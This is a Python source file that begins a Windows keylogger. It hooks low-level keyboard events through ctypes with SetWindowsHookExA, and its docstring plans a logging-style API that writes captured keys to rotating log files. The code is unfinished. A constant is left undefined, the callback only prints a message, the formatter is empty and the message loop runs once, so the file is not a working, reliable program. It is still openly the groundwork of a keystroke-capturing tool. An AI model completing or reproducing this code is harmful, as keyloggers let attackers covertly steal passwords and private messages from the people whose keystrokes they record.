# -*- coding: utf-8 -*-

'''
Build something similar to the logging interface.


klogger = keylogging.Keylogger()
klogger.set_level(keylogging.KEY_RELEASE)

handler = keylogging.RotatingFileHandler(
        LOG_FILENAME,
        maxBytes=20,
        backupCount=5,
)
handler.set_level(keylogging.KEY_RELEASE)
formatter = keylogging.Formatter('%(ascii)')
handler.set_formatter(formatter)

klogger.add_handler(handler)

klogger.log_forever()
klogger.logger_shutdown()
'''

import sys
from ctypes import *
from ctypes.wintypes import DWORD, MSG


user32 = windll.user32
kernel32 = windll.kernel32


KEY_PRESS = 1
KEY_RELEASE = 2


class WindowsHookKeylogger:

    def __init__(self, level=KEY_RELEASE):
        self.level = level
        self.handlers = []
    
    def set_level(self, level):
        self.level = level

    def add_handler(self, handler):
        if handler not in self.handlers:
            self.handlers.append(handler)

    def log_forever(self):
        self._run()

    def logger_shutdown(self):
        pass

    def _run(self):
        
        def callback(self, nCode, wParam, lParam):
            print('keyboard event!')

        hook = _WindowsKeyboardHook(callback)
        hook.install()
        try:
            self._pump_messages()
        finally:
            hook.uninstall()

    def _pump_messages(self):
        msg = MSG()
        user32.GetMessageA(byref(msg), 0, 0, 0)


class Formatter:
    pass


class _WindowsKeyboardHook:

    def __init__(self, callback):
        self.callback = callback
        self._handle = None
        self._type = WH_KEYBOARD_LL

    def __enter__(self):
        self.install()
        return self

    def __exit__(self, *args):
        self.uninstall()

    @property
    def callback(self):
        return self._callback

    @callback.setter
    def callback(self, cb):
        wrapper = self._wrap_callback(cb)
        self._pointer = self._create_pointer(wrapper)
        self._callback = cb

    def install(self):
        if self._handle is not None:
            return

        self._handle = user32.SetWindowsHookExA(
                self._type,
                self._pointer,
                kernel32.GetModuleHandleW(None),
                0,
        )
        if not self._handle:
            return False
        return True

    def uninstall(self):
        if self._handle is None:
            return
        user32.UnhookWindowsHookEx(self._handle)
        self._handle = None

    def _wrap_callback(self, callback):
        def wrapper(nCode, wParam, lParam):
            callback(nCode, wParam, lParam)
            return user32.CallNextHookEx(self._handle, nCode, wParam, lParam)
        return wrapper

    def _create_pointer(self, func):
        CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
        return CMPFUNC(func)

